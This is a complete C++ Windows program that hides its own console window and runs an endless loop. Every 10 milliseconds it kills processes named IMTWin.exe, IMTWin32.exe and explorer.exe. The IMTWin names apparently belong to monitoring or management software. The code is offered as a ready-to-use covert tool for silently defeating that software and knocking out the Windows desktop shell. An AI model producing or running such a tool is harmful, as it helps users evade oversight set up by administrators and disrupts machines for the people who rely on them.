#include <windows.h>
#include <tlhelp32.h>
#include <thread>
#include <string>
#include <vector>

// Configuration
const std::vector<std::wstring> TARGET_PROCESSES = {
    L"IMTWin.exe",
    L"IMTWin32.exe",
    L"explorer.exe"
};

// Process termination with error handling
void KillProcess(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe32 = { sizeof(PROCESSENTRY32W) };
    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return;
    }

    do {
        if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
}

// Main entry point (hidden window)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console completely
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Main loop
    while (true) {
        for (const auto& process : TARGET_PROCESSES) {
            KillProcess(process);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    return 0;
}
